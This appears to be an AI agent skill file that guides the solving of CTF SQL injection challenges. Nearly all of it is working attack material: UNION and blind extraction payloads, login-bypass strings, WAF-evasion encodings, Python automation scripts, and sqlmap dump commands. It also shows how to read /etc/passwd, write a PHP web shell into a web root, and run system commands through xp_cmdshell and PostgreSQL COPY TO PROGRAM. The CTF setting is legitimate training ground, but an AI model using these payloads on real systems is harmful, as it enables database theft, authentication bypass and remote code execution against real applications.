---
name: ctf-sqli
description: This skill should be used when solving CTF (Capture The Flag) SQL injection challenges. Triggers include: login forms bypass, URL parameters with SQL syntax errors, search/filter functionality, UNION-based extraction, blind SQL injection (boolean/time), and database exploitation.
---

# CTF SQL Injection

## Overview

This skill provides systematic workflows for solving CTF SQL injection challenges. It covers authentication bypass, data extraction via UNION injection, blind SQLi, and common WAF bypass techniques.

**Core principle**: Always identify the injection point first, then determine the database type, then extract data methodically.

---

## Quick Start Checklist

1. Identify injection point (URL param, POST data, Cookie, Header)
2. Test with single quote `'` to trigger SQL error
3. Determine database type from error messages
4. Check number of columns with `ORDER BY`
5. Find displayable column position with `UNION SELECT`
6. Extract database structure (tables, columns)
7. Extract flag from target table

---

## Category 1: Detection & Fingerprinting

### Basic Detection

```bash
URL="http://target/page.php?id=1"

# Test injection points
curl -s "$URL'"                          # Single quote -> error?
curl -s "$URL AND 1=1"                  # Boolean: true
curl -s "$URL AND 1=2"                  # Boolean: false (different result?)
curl -s "$URL ORDER BY 1--+"            # Column count
curl -s "$URL ORDER BY 5--+"            # Increase until error
```

### Database Fingerprinting

```sql
-- MySQL
SELECT version();          -- 5.x or 8.x
SELECT @@version;
SELECT database();
SELECT user();
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database();
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users';
-- MySQL specific: comment is -- , #, or /**/

-- SQLite
SELECT sqlite_version();
SELECT name FROM sqlite_master WHERE type='table';
-- SQLite: no information_schema, use sqlite_master

-- PostgreSQL
SELECT version();
SELECT current_database();
SELECT current_user;
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
-- PostgreSQL: comment is -- , string concat is ||

-- MS SQL Server
SELECT @@VERSION;
SELECT DB_NAME();
SELECT name FROM sysobjects WHERE xtype='U';
-- MS SQL: comment is --, string concat is +

-- Oracle
SELECT banner FROM v$version;
SELECT * FROM all_tables WHERE owner=USER;
-- Oracle: no dual-free SELECT, comment is --
```

---

## Category 2: UNION-based Injection

### Standard Workflow

```bash
# Step 1: Find column count
curl -s "http://target/page.php?id=1 ORDER BY 1--+"      # OK
curl -s "http://target/page.php?id=1 ORDER BY 2--+"      # OK
curl -s "http://target/page.php?id=1 ORDER BY 3--+"      # OK
curl -s "http://target/page.php?id=1 ORDER BY 4--+"      # ERROR -> 3 columns

# Step 2: Find displayable column
curl -s "http://target/page.php?id=-1 UNION SELECT 1,2,3--+"
# Page will show which column numbers are displayed

# Step 3: Extract database name
curl -s "http://target/page.php?id=-1 UNION SELECT 1,database(),3--+"

# Step 4: Extract table names (MySQL)
curl -s "http://target/page.php?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+"

# Step 5: Extract column names
curl -s "http://target/page.php?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag_table'--+"

# Step 6: Extract flag
curl -s "http://target/page.php?id=-1 UNION SELECT 1,flag,3 FROM flag_table--+"
```

### WAF Bypass Techniques

```bash
# Space bypass
%09 (tab), %0a (newline), %0b, %0c, %0d, /**/, +, %20

# Case variation
uNiOn SeLeCt

# Comment injection
UN/**/ION/**/SEL/**/ECT
UNI%0AON SEL%0AECT

# Double encoding
%2527 -> %27 -> '

# Keyword bypass
'select' -> '!select@!' (inline comment)
'select' -> 'sel<>ect' (remove_comments filter)
'select' -> '0x73656c656374' (hex encode)

# Common WAF bypass combinations
?id=1/**/union/**/select/**/1,2,3
?id=1/*!union*//*!select*/1,2,3
?id=1%0aunion%0aselect%0a1,2,3
?id=-1 union all select 1,2,3
```

---

## Category 3: Authentication Bypass

### Login Form Bypass

```bash
# Classic payloads
username: admin' OR '1'='1'--+
username: admin' OR '1'='1'#
username: admin' OR 1=1--+
username: ' OR 1=1--+
username: ' OR '1'='1
username: admin'/*
username: ' or ''='

# POST-based injection
curl -s -X POST "$URL" -d "username=admin' OR '1'='1'--+&password=anything"
curl -s -X POST "$URL" -d "username=admin'--+&password=anything"
curl -s -X POST "$URL" -d "username=' OR 1=1--+&password=x"

# Cookie-based injection
curl -s "$URL" -H "Cookie: username=admin' OR '1'='1'--+"
curl -s "$URL" -H "Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ=="
```

###万能密码（Common Bypass Passwords）

```sql
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 'a'='a
admin'--
admin'#
admin'/*
1' OR '1'='1
' OR ''='
' = '
```

---

## Category 4: Boolean-based Blind SQLi

### Manual Extraction

```bash
URL="http://target/item.php?id=1"

# Test: is condition true?
curl -s "$URL AND (SELECT SUBSTRING(database(),1,1))='a'--+"
curl -s "$URL AND (SELECT SUBSTRING(database(),1,1))='b'--+"
# Compare page length to determine true/false

# Binary search for faster extraction
# Does database name start with 'a'-'m'?
curl -s "$URL AND ASCII(SUBSTRING(database(),1,1))>109--+"

# Extract each character
for pos in $(seq 1 30); do
  for ascii in $(seq 32 126); do
    resp=$(curl -s -o /dev/null -w "%{size_download}" "$URL AND ASCII(SUBSTRING(database(),$pos,1))=$ascii--+")
    # Compare with known "true" response size
    if [ "$resp" = "TRUE_SIZE" ]; then
      printf "\$(printf '\\x$(printf '%x' $ascii)')"
      break
    fi
  done
done
```

### Python Blind SQLi Automation

```python
import requests, string

def blind_sqli(url, true_indicator, payload_func):
    """
    url: base URL with injection point
    true_indicator: string in response that indicates TRUE
    payload_func: function(char_pos, ascii_val) -> injection condition
    """
    charset = string.printable[:95]  # all printable ASCII
    result = ''
    
    for pos in range(1, 100):  # max 100 chars
        found = False
        for c in charset:
            payload = payload_func(pos, ord(c))
            resp = requests.get(url + payload)
            if true_indicator in resp.text:
                result += c
                print(f"Position {pos}: {c} -> {result}")
                found = True
                break
        if not found:
            print(f"End of string at position {pos}")
            break
    
    return result

# MySQL example: extract database name
def extract_db_name(pos, ascii_val):
    return f" AND ASCII(SUBSTRING(database(),{pos},1))={ascii_val}--+"

# Extract table content
def extract_flag(pos, ascii_val):
    return f" AND ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),{pos},1))={ascii_val}--+"

# Usage
# result = blind_sqli("http://target/item.php?id=1", "Welcome", extract_flag)
```

---

## Category 5: Time-based Blind SQLi

### When no visible difference between TRUE and FALSE

```bash
# MySQL
curl -s "http://target/item.php?id=1 AND IF(1=1,SLEEP(3),0)--+"
curl -s "http://target/item.php?id=1 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)--+"

# PostgreSQL
curl -s "http://target/item.php?id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--+"

# MS SQL
curl -s "http://target/item.php?id=1; IF 1=1 WAITFOR DELAY '0:0:3'--+"

# SQLite
curl -s "http://target/item.php?id=1 AND (SELECT CASE WHEN SUBSTR(database(),1,1)='a' THEN randomblob(500000000) ELSE 0 END)--+"
```

### Python Time-based Blind SQLi

```python
import requests, time, string

def time_blind_sqli(url, payload_func, delay=3, timeout=10):
    charset = string.printable[:95]
    result = ''
    
    for pos in range(1, 100):
        found = False
        # Binary search for speed
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = payload_func(pos, mid)
            start = time.time()
            try:
                requests.get(url + payload, timeout=timeout)
            except requests.Timeout:
                pass
            elapsed = time.time() - start
            
            if elapsed >= delay - 0.5:
                # ASCII value is >= mid
                result_low = mid
                low = mid + 1
            else:
                high = mid - 1
        
        # Verify the found character
        payload = payload_func(pos, low - 1)
        start = time.time()
        try:
            requests.get(url + payload, timeout=timeout)
        except: pass
        elapsed = time.time() - start
        
        if elapsed >= delay - 0.5:
            result += chr(low - 1)
            print(f"Position {pos}: {chr(low-1)} -> {result}")
        else:
            break
    
    return result

# MySQL time-based
def mysql_time_extract(pos, ascii_val):
    return f" AND IF(ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),{pos},1))={ascii_val},SLEEP({3}),0)--+"
```

---

## Category 6: Stacked Queries & File Operations

### File Read/Write (MySQL)

```sql
-- Read file
LOAD_FILE('/etc/passwd')
UNION SELECT 1,LOAD_FILE('/etc/passwd'),3

-- Write file (requires FILE privilege)
UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3 INTO OUTFILE '/var/www/html/shell.php'
UNION SELECT 1,2,3 INTO DUMPFILE '/tmp/flag.txt'
```

### Command Execution via SQLi

```sql
-- MySQL UDF (User Defined Function)
-- If you can write to plugin directory:
UNION SELECT 1,2,3 INTO DUMPFILE '/usr/lib/mysql/plugin/cmd.so';

-- xp_cmdshell (MS SQL)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- PostgreSQL command execution
COPY (SELECT '') TO PROGRAM 'id';
```

---

## Category 7: Second Order Injection

```python
# Second order: injection stored in DB, triggered on later query
# Step 1: Register with malicious payload
requests.post(url + '/register', data={
    'username': "admin'--+",  # Will be stored
    'password': 'password',
    'email': 'attacker@evil.com'
})

# Step 2: Trigger the stored payload
requests.post(url + '/login', data={
    'username': 'admin',   # Real admin
    'password': 'wrongpass'
})
# The stored admin'--+ comment causes: WHERE username='admin'--+' AND password='...'
```

---

## Category 8: SQLMap Quick Reference

```bash
# Basic usage
sqlmap -u "http://target/page.php?id=1" --dbs

# POST request
sqlmap -u "http://target/login.php" --data="username=admin&password=test" --dbs

# Cookie injection
sqlmap -u "http://target/page.php" --cookie="id=1*" --dbs

# Specify database type
sqlmap -u "http://target/page.php?id=1" --dbms=mysql

# Extract tables from specific database
sqlmap -u "http://target/page.php?id=1" -D target_db --tables

# Extract columns from specific table
sqlmap -u "http://target/page.php?id=1" -D target_db -T users --columns

# Dump table contents
sqlmap -u "http://target/page.php?id=1" -D target_db -T flags --dump

# Risk and level
sqlmap -u "http://target/page.php?id=1" --level=5 --risk=3

# Tamper scripts (WAF bypass)
sqlmap -u "http://target/page.php?id=1" --tamper=space2comment,between
sqlmap -u "http://target/page.php?id=1" --tamper=unmagicquotes

# Common useful tamper scripts:
# space2comment     - replace space with /**/
# between           - replace > with NOT BETWEEN
# randomcase        - random case of keywords
# charencode        - URL encode characters
# space2plus        - replace space with +
# unionalltounion   - replace UNION ALL with UNION
```

---

## Decision Tree

```
Start: Got a SQL injection challenge
  |
  +-- Identify injection point
  |     URL param? POST data? Cookie? Header?
  |     Test: ' , " , ) , AND 1=1, AND 1=2
  |
  +-- Is there an error message with SQL syntax?
  |     Yes -> Database type known from error
  |            -> Try UNION-based extraction
  |
  +-- Is it a login form?
  |     Yes -> Authentication bypass: ' OR '1'='1'--+
  |
  +-- Does TRUE/FALSE give different page sizes?
  |     Yes -> Boolean-based blind injection
  |            Extract character by character
  |
  +-- No visible difference at all?
  |     Yes -> Time-based blind injection
  |            Use SLEEP() / pg_sleep() / WAITFOR
  |
  +-- WAF blocking SQL keywords?
        Yes -> Apply bypass techniques
               Space/**/, %0a, case variation, encoding
```

---

## Real Cases

### Case 1: Classic UNION Injection

**Challenge**: News site with `?id=` parameter
**Solution**: `?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()`
**Key**: Always use `-1` or invalid ID to ensure the UNION result is displayed.

### Case 2: Login Bypass

**Challenge**: Admin login form
**Solution**: Username: `admin'--+`, Password: anything
**Key**: The `--+` comments out the password check.

---

## Cheat Sheet: Quick Payloads

```sql
-- Test injection
' OR 1=1--+
' UNION SELECT 1,2,3--+
' AND 1=1--+

-- Extract info (MySQL)
' UNION SELECT 1,database(),3--+
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='TARGET_TABLE'--+
' UNION SELECT 1,column_name,3 FROM target_table LIMIT 1--+

-- Read file
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--+

-- Time-based test
' AND IF(1=1,SLEEP(3),0)--+
```

---

## Tools Summary

| Tool | Purpose | Install |
|------|---------|---------|
| sqlmap | Automated SQL injection | pip install sqlmap |
| jsql | GUI SQL injection tool | Download from GitHub |
| havij | Windows SQLi scanner | Download |
| burpsuite | Manual SQLi testing | Free download |
| bbqsql | Blind SQLi framework | pip install bbqsql |
